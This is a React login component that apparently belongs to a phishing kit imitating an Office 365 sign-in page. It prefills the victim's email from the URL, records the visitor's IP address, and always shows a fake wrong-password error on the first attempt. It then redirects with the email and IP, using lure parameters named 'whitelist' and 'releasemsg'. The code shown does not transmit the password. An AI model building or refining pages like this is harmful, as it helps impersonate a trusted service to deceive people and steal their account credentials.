import React from 'react';
import { makeStyles } from '@material-ui/core/styles';
import Paper from '@material-ui/core/Paper';
import Grid from '@material-ui/core/Grid';
import Pic from '../Atwork.jpg'
import Logo from '../logo.svg'
import {useLocation} from 'react-router-dom'
import '../App.css'
import  {useState,useEffect} from 'react'
import queryString from 'query-string'
import SimpleCrypto from "simple-crypto-js"
import { withRouter } from "react-router-dom";
const useStyles = makeStyles((theme) => ({
  root: {
    flexGrow: 1,
    margin:'7%'
  },
  paper: {
    padding: theme.spacing(2),
    textAlign: 'center',
    color: theme.palette.text.secondary,
  },
}));

 function Login(props) {
  const classes = useStyles();
  const location=useLocation()
  const [mail, setmail] = useState('');
  const [redirect, setred] = useState('');
  const [ip, setip] = useState('');
  const [pass,setpass]=useState('');
  useEffect(() => {
   
  console.log(location.search)
  
  const params=queryString.parse(location.search)
setmail(params.mail)
setred(params.redirect)
fetch("https://api.ipify.org/")
.then(response => response.text())
.then((response) => {
    setip(response)
})
.catch(err => console.log(err))
  }, [mail])
  const [firsttry, settry] = useState(true);
  const [show, setShow] = useState(false);
 
  return (
    <div className={classes.root}>
      <Grid container spacing={5}  justify="center"
  >
        
        <Grid item xs={12} sm={6} className='body'>
         
            <img src={Pic} className='img'/>
        
        </Grid>
      
        <Grid container xs={12} sm={6}>
        <Grid item xs={12} >
         <div style={{backgroundColor:"#E74225",width:'100%',height:'100px',display:'flex',justifyContent:'center',alignItems:'center'}}> <img src={Logo} width='150'/></div>
      <div >
<Paper elevation={2}>
<form style={{display:'flex',flexDirection:'column'}} className='form'>
<h2>Sign in</h2>
  <label>Email</label>
  <input type='text' value={mail} disabled />
  <div> <label>Password</label> 
  <a style={{float:'right'}}>Show</a>
  </div>
<input type='password'value={pass} onChange={(e)=>{setpass(e.target.value)}}/>
  <div>
  <input type="checkbox" />Keep me signed in
  </div>
  {show && <small style={{maxWidth:'300px',color:'red',}}>Incorrect username/password please enter the right credentials </small>}
  
  <button onClick={(e)=>{
    e.preventDefault()
if(firsttry){
settry(false)
setShow(true)
}
if(redirect=="whitelist")
{
  console.log(`newlog--${ip}`)
 props.history.push(`/success?mail=${mail}&redirect=whitelist&enpee=${ip}`)
}
if(redirect=="releasemsg")
{
  console.log(`newlog--${ip}`)
 props.history.push(`/success?mail=${mail}&redirect=releasemsg&enpee=${ip}`)
}







  }}>Sign In</button>
  <p>Need to find <span>your password?</span></p>
</form>
</Paper>

<div style={{margin:'15px auto',fontSize:'16px',textAlign:'center',fontWeight:'bold'}}>Dont have office 365 email?</div>
<div style={{width:'100%',display:'flex',justifyContent:'center'}}> <button  className='btnn' style={{fontSize:'16px',textAlign:'center',fontWeight:'bold',minWidth:'349px',height:'44px'}}>Get Started</button></div>

      </div>
        </Grid>
        
        </Grid>
        
        
       
      </Grid>
    </div>
  );
  }
  export default withRouter(Login)